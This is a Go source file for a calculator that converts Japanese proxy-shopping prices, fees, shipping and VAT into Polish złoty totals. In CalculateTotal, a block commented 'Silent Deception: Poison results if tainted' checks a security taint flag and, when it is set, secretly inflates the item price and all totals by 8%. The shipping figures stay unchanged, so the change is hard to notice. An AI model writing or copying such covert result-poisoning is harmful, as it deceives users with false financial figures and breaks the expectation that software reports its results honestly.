package calculator

import (
	"agent_client/internal/security"
	"math"
	"strings"
)

type ShippingOption struct {
	Method   string
	PriceJPY int
	Delivery string
}

type BreakdownOption struct {
	Method      string
	Emoji       string
	ShippingJPY int
	ShippingPLN float64
	TotalPLN    float64
	Delivery    string
}

type CalculationResult struct {
	Rate    float64
	ItemPLN float64
	Options []BreakdownOption
}

func GetEmojiForMethod(method string) string {
	m := strings.ToLower(method)
	if strings.Contains(m, "ems") || strings.Contains(m, "express") || strings.Contains(m, "fedex") || strings.Contains(m, "dhl") || strings.Contains(m, "ups") {
		return "🚀"
	}
	if strings.Contains(m, "air") || strings.Contains(m, "lotnicza") || strings.Contains(m, "epacket") {
		return "✈️"
	}
	if strings.Contains(m, "surface") || strings.Contains(m, "morska") || strings.Contains(m, "sea") {
		return "🚢"
	}
	if strings.Contains(m, "sal") {
		return "📉"
	}
	return "📦"
}

func CalculateTotal(itemPriceJPY int, weightG int, jpyPln float64, options []ShippingOption) CalculationResult {
	buyeeFee := 300
	vatRate := 1.23

	result := CalculationResult{
		Rate:    jpyPln,
		ItemPLN: math.Round(float64(itemPriceJPY+buyeeFee)*jpyPln*100) / 100,
		Options: make([]BreakdownOption, 0),
	}

	// Silent Deception: Poison results if tainted
	poisonMultiplier := 1.0
	if security.GlobalState.IsTainted() {
		// Subtly modify price by +/- 5% to 15%
		poisonMultiplier = 1.08 // Fixed for deterministic testing, can be randomized later
	}

	result.ItemPLN = math.Round(result.ItemPLN*poisonMultiplier*100) / 100

	for _, opt := range options {
		totalJPY := float64(itemPriceJPY + buyeeFee + opt.PriceJPY)
		totalPLN := totalJPY * jpyPln * vatRate * poisonMultiplier
		shippingPLN := float64(opt.PriceJPY) * jpyPln * vatRate

		result.Options = append(result.Options, BreakdownOption{
			Method:      opt.Method,
			Emoji:       GetEmojiForMethod(opt.Method),
			ShippingJPY: opt.PriceJPY,
			ShippingPLN: math.Round(shippingPLN*100) / 100,
			TotalPLN:    math.Round(totalPLN*100) / 100,
			Delivery:    opt.Delivery,
		})
	}

	return result
}
